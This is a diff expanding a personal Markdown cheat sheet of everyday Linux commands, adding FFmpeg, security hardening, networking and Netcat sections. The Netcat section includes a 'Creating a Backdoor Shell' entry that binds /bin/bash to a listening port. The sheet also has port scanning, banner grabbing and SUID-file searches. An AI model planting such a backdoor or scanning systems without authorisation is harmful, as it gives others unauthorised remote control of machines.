@@ -4,22 +4,28 @@ All the commands I use on my daily basis
 
 ## Table Of Contents
 - [LINUX COMMANDS by LUK6XFF](#linux-commands-by-luk6xff)
-  - [Table Of Contents](#table-of-contents)
   - [User](#user)
   - [Docker](#docker)
   - [Hardware](#hardware)
   - [File System](#file-system)
   - [Performance](#performance)
-  - [Command Line](#command-line) TODO
   - [Bash](#bash)
-  - [Networking](#networking) TODO
-  - [Netcat](#netcat) TODO
   - [Cron](#cron)
   - [SSH](#ssh)
   - [Python](#python)
   - [Tmux](#tmux)
   - [Git](#git)
-  - [FFMpeg](#ffmpeg) TODO
+  - [FFMpeg](#ffmpeg)
+  - [System Administration](#system-administration)
+  - [Security](#security)
+  - [Package Management](#package-management)
+  - [Networking and Internet](#networking-and-internet)
+  - [Netcat](#netcat)
+  - [File and Disk Management](#file-and-disk-management)
+  - [Advanced Command Line Tricks](#advanced-command-line-tricks)
+
+
+
 
 
 
@@ -195,6 +201,16 @@ docker save IMAGE_NAME > IMAGE_NAME.tar.gz
 * Load (import) an image
 ```
 docker load -i IMAGE_NAME.tar.gz
+```
+
+* Find the sha256 hash of a docker image?
+```
+docker inspect --format='{{index .RepoDigests 0}}' IMAGE_NAME
+```
+
+* Pull docker-image by the sha256 digest
+```
+docker pull IMAGE_NAME@sha256:0a3b2cc81
 ```
 
 
@@ -1006,9 +1022,93 @@ git clean -fd
 git reset <commitID>
 ```
 
+## FFMpeg
+- **Convert video from one format to another**
+  ```
+  ffmpeg -i input.mp4 output.avi
+  ```
+
+- **Extract audio from video**
+  ```
+  ffmpeg -i input.mp4 -vn -acodec copy output.aac
+  ```
+
+- **Convert audio files to different formats**
+  ```
+  ffmpeg -i input.mp3 output.ogg
+  ```
+
+- **Reduce video file size**
+  ```
+  ffmpeg -i input.mp4 -vcodec libx265 -crf 28 output.mp4
+  ```
+
+- **Extract a single image from a video at a specific time**
+  ```
+  ffmpeg -ss 00:00:10 -i input.mp4 -frames:v 1 output.jpg
+  ```
+  `-ss` specifies the start time, e.g., `00:00:10` for 10 seconds into the video.
+
+- **Create a video from a series of images**
+  ```
+  ffmpeg -f image2 -i image%d.jpg video.mp4
+  ```
+  This command assumes your images are named in a sequence (image1.jpg, image2.jpg, ...).
+
+- **Add audio to a video file (replacing existing audio)**
+  ```
+  ffmpeg -i video.mp4 -i audio.mp3 -c:v copy -c:a aac -strict experimental output.mp4
+  ```
+
+- **Trim video files without re-encoding**
+  ```
+  ffmpeg -ss 00:00:30 -to 00:01:30 -i input.mp4 -c copy output.mp4
+  ```
+  `-ss` is the start time, `-to` is the end time.
+
+- **Combine multiple video files (of the same format)**
+  ```
+  ffmpeg -f concat -safe 0 -i filelist.txt -c copy output.mp4
+  ```
+  `filelist.txt` should contain a list of the files to combine, formatted like: `file 'input1.mp4'` on each line.
+
+- **Add subtitles to a video**
+  ```
+  ffmpeg -i input.mp4 -i subtitles.srt -c:v copy -c:a copy -c:s mov_text output.mp4
+  ```
+
+- **Extract a portion of audio**
+  ```
+  ffmpeg -i input.mp3 -ss 00:00:30 -to 00:01:30 -c copy output.mp3
+  ```
+
+- **Change the resolution of a video**
+  ```
+  ffmpeg -i input.mp4 -s 1280x720 -c:a copy output.mp4
+  ```
+  `-s` specifies the target resolution.
+
+- **Create a GIF from a video**
+  ```
+  ffmpeg -ss 5 -t 3 -i input.mp4 -vf "fps=10,scale=320:-1:flags=lanczos" -c:v gif -f gif output.gif
+  ```
+  `-ss` is the start time, `-t` is the duration of the GIF, and `scale` sets the GIF size.
+
+- **Overlay an image on a video**
+  ```
+  ffmpeg -i video.mp4 -i image.png -filter_complex "overlay=10:10" -codec:a copy output.mp4
+  ```
+  `overlay=10:10` positions the image 10 pixels from the top and 10 pixels from the left.
+
+- **Speed up or slow down a video**
+  ```
+  ffmpeg -i input.mp4 -filter:v "setpts=0.5*PTS" output.mp4
+  ```
+  Use `setpts=0.5*PTS` to double the speed, or `setpts=2.0*PTS` to halve the speed.
+
 
 ## Tmux
-* Commands
+* **Commands**
 ```
 tmux ls = list sessions
 tmux new = new session
@@ -1017,7 +1117,7 @@ tmux attach -b =  attach to session, disconnect other connections
 tmux kill-session
 ```
 
-* Keys
+* **Keys**
 ```
 Ctrl-b-d = detach from current session
 Ctrl-b-n  = creates new window
@@ -1031,3 +1131,381 @@ Ctrl-b-q = show panes
 Ctrl-b-V = new vertical pane
 Ctrl-b-arrow = switch pane
 ```
+
+
+## System Administration
+
+- **System Information and Management**
+  ```
+  # Display system and hardware information
+  inxi -F
+
+  # Monitor system activities interactively
+  htop
+
+  # Display disk usage for all mounted filesystems
+  df -h
+
+  # Display free and used memory in the system
+  free -h
+
+  # Display or set the system's host name
+  hostnamectl set-hostname [new-hostname]
+  ```
+
+- **System Monitoring and Process Management**
+  ```
+  # Interactive process viewer and system monitor
+  top
+
+  # Kill processes based on name and other attributes
+  pkill -f [process-name]
+
+  # Display user login history
+  lastlog
+
+  # Show system reboot history
+  last reboot
+  ```
+
+## Security
+- **Firewall Management**
+  ```
+  # List all firewall rules
+  sudo ufw status verbose
+
+  # Enable firewall
+  sudo ufw enable
+
+  # Allow a specific port
+  sudo ufw allow [port]
+
+  # Deny access to a specific port
+  sudo ufw deny [port]
+  ```
+
+- **Secure File Transfer**
+  ```
+  # Securely copy files between hosts
+  rsync -avz [source] [destination]
+  ```
+
+- **System Updates and Security Patches**
+  ```
+  # Update package information
+  sudo apt update
+
+  # Upgrade all packages
+  sudo apt full-upgrade
+
+  # Automatically remove unused packages
+  sudo apt autoremove
+  ```
+### System Security Audits
+
+- **Audit Installed Packages for Security Vulnerabilities**
+  ```
+  # Debian/Ubuntu
+  sudo apt install unattended-upgrades
+  sudo unattended-upgrade
+
+  # Red Hat/CentOS
+  sudo yum install yum-cron
+  sudo systemctl start yum-cron
+
+  # Check for vulnerabilities (Debian-based systems)
+  sudo apt-get install debian-goodies
+  checkrestart
+  ```
+
+- **Using Lynis for Security Auditing**
+  ```
+  # Install Lynis
+  sudo apt-get install lynis
+
+  # Run Lynis audit
+  sudo lynis audit system
+  ```
+
+### User and Permission Management
+
+- **Find Files with SUID & SGID Permissions**
+  ```
+  find / -perm /4000 2>/dev/null  # SUID
+  find / -perm /2000 2>/dev/null  # SGID
+  ```
+
+- **Changing File Permissions and Ownership**
+  ```
+  # Change file ownership
+  sudo chown [user]:[group] [file]
+
+  # Change file permissions recursively for a directory
+  sudo chmod -R [permissions] [directory]
+  ```
+
+- **Setting up and Using sudo**
+  ```
+  # Add user to the sudo group (Debian/Ubuntu)
+  sudo usermod -aG sudo [username]
+
+  # Edit sudoers file safely
+  sudo visudo
+  ```
+
+### Secure Communication
+
+- **SSH Key-Based Authentication**
+  ```
+  # Generate SSH key pair
+  ssh-keygen
+
+  # Copy public key to remote server
+  ssh-copy-id [user]@[hostname]
+  ```
+
+- **Encrypting and Decrypting Files with GPG**
+  ```
+  # Encrypt file
+  gpg -c [file]
+
+  # Decrypt file
+  gpg [file.gpg]
+  ```
+
+- **Securely Wipe Disk using shred**
+  ```
+  # Securely wipe a disk
+  sudo shred -n 5 -vz /dev/[device]
+  # Note: `-n` specifies the number of passes, and `-vz` enables verbose output and zeroes at the last pass to hide shredding.
+  ```
+
+
+### Network Security
+
+- **Scanning with Nmap**
+  ```
+  # Simple scan
+  nmap [target]
+
+  # Scan specific ports
+  nmap -p [port range] [target]
+
+  # OS detection, version detection, script scanning, and traceroute
+  nmap -A [target]
+  ```
+
+- **Checking for Listening Ports**
+  ```
+  # Netstat is deprecated in favor of ss
+  ss -tulwn
+  ```
+
+- **Blocking IP Addresses with iptables**
+  ```
+  # Block an IP address
+  sudo iptables -A INPUT -s [IP address] -j DROP
+
+  # List iptables rules
+  sudo iptables -L
+  ```
+
+- **Using Fail2Ban for Protection Against Brute Force Attacks**
+  ```
+  # Install Fail2Ban
+  sudo apt-get install fail2ban
+
+  # Configure Fail2Ban
+  sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+  sudo nano /etc/fail2ban/jail.local
+
+  # Start Fail2Ban service
+  sudo systemctl start fail2ban
+  sudo systemctl enable fail2ban
+  ```
+
+### Additional Tools and Commands
+
+- **Checking for Rootkits with rkhunter**
+  ```
+  # Install rkhunter
+  sudo apt-get install rkhunter
+
+  # Update rkhunter's database
+  sudo rkhunter --update
+
+  # Perform a rootkit scan
+  sudo rkhunter --check
+  ```
+
+- **Monitoring System Logs for Suspicious Activity**
+  ```
+  # Tail the syslog file
+  sudo tail -f /var/log/syslog
+
+  # Check authentication logs
+  sudo less /var/log/auth.log
+  ```
+
+## Package Management
+
+- APT (Advanced Package Tool)
+  ```
+  # Search for packages
+  apt search [package-name]
+
+  # Install a package
+  sudo apt install [package-name]
+
+  # Remove a package
+  sudo apt remove [package-name]
+
+  # List installed packages
+  dpkg -l
+  ```
+
+- Snap Packages
+  ```
+  # Install a snap package
+  sudo snap install [package-name]
+
+  # Update snap packages
+  sudo snap refresh
+
+  # List installed snap packages
+  snap list
+  ```
+
+## Networking and Internet
+
+- IP Address and Networking
+  ```
+  # Display all network interfaces and IP address
+  ip addr show
+
+  # Display routing table
+  ip route
+
+  # Test network connection to a host
+  ping [host]
+
+  # Display network connections, routing tables, interface statistics
+  netstat -tuln
+  ```
+
+- Network Troubleshooting
+  ```
+  # Diagnose path to a network host
+  traceroute [host]
+
+  # Capture and analyze network packets
+  tcpdump -i [interface]
+  ```
+
+## Netcat
+
+- **Basic Client & Server Setup**
+  ```
+  # Listen on a specific port
+  nc -l 1234
+
+  # Connect to a listening port
+  nc [hostname] 1234
+  ```
+
+- **File Transfer**
+  ```
+  # On the receiving side
+  nc -l 1234 > filename.ext
+
+  # On the sending side
+  nc [hostname] 1234 < filename.ext
+  ```
+
+- **Chat Application**
+  ```
+  # On one machine, set up to listen
+  nc -l 1234
+
+  # On another machine, connect to the listener
+  nc [first machine's hostname or IP address] 1234
+  ```
+
+- **Port Scanning**
+  ```
+  # Scan ports of a remote host
+  nc -zv [hostname] [port range]
+  # Example: nc -zv example.com 20-30
+  ```
+
+- **Banner Grabbing**
+  ```
+  # Grab the banner of a service running on a port
+  nc -v [hostname] [port]
+  # Example: nc -v example.com 22
+  ```
+
+- **Creating a Simple Web Server**
+  ```
+  # Serve a single file on HTTP port
+  { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat index.html; } | nc -l 80
+  ```
+
+- **Using Netcat for UDP**
+  ```
+  # Listen on a UDP port
+  nc -lu [port]
+
+  # Connect to a UDP port
+  nc -u [hostname] [port]
+  ```
+
+- **Network Debugging**
+  ```
+  # Using Netcat to test TCP connections, check if a port is open
+  nc -zv [hostname] [port]
+
+  # Echo service to return what you type, useful for debugging
+  nc -l -p [port] -e /bin/cat
+  ```
+
+- **Creating a Backdoor Shell**
+  ```
+  # On the target machine, listen for a connection
+  nc -lvp [port] -e /bin/bash
+
+  # On your machine, connect to the target
+  nc [target IP address] [port]
+  ```
+
+
+## File and Disk Management
+
+- **Find Large Files and Directories**
+  ```
+  # Find files larger than 1GB
+  find / -type f -size +1G
+
+  # Summarize disk usage of each file, recursively for directories
+  du -ah | sort -rh | head -n 20
+  ```
+
+- **Disk Health and Performance**
+  ```
+  # Check and repair a Linux filesystem
+  fsck /dev/sda1
+
+  # Benchmark disk read and write speed
+  dd if=/dev/zero of=tempfile bs=1M count=1024 conv=fdatasync,notrunc
+  ```
+
+## Advanced Command Line Tricks
+
+- **Command Line Productivity**
+  ```
+  # Use `Ctrl + R` to search through previously used commands
+  # Use `Ctrl + A` to move to the beginning of the line
+  # Use `Ctrl + E` to move to the end of the line
+  # Use `Ctrl + K` to cut the line from cursor to the end
+  # Use `Ctrl + U` to cut/delete the line from cursor to the beginning
+  ```
